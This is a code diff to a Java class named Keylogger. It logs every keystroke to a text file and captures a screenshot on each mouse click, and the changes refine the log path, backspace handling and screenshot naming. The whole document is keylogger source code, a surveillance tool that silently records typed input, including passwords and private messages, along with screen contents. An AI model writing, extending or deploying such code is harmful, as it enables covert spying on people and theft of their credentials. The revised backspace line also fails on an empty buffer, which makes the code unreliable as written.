@@ -32,7 +32,7 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
     static String buffer_str="";
     public static void main(String[] args) throws IOException {
         //TODO code application logic here
-        FileWriter fl=new FileWriter("Screenshots.logs.txt");
+        FileWriter fl=new FileWriter("Screenshots/logs.txt");
         BufferedWriter br=new BufferedWriter(fl);
         
         br.write(" \n");
@@ -73,7 +73,7 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
     if(nke.getKeyCode()==NativeKeyEvent.VC_SPACE)
        buffer_str=buffer_str+" ";
     else if(nke.getKeyCode()==NativeKeyEvent.VC_BACKSPACE)
-        buffer_str=buffer_str+" <- ";
+        buffer_str=buffer_str.substring(0, buffer_str.length()-1);
 
     else
         buffer_str=buffer_str+NativeKeyEvent.getKeyText(nke.getKeyCode());
@@ -89,7 +89,7 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
 
     @Override
     public void nativeMouseClicked(NativeMouseEvent nme) {
-        Screenshot s=new Screenshot(x.toString()+"");
+        Screenshot s=new Screenshot(Calendar.getInstance().getTime().toString()+"");
         s.getscreenshot();
     }
 
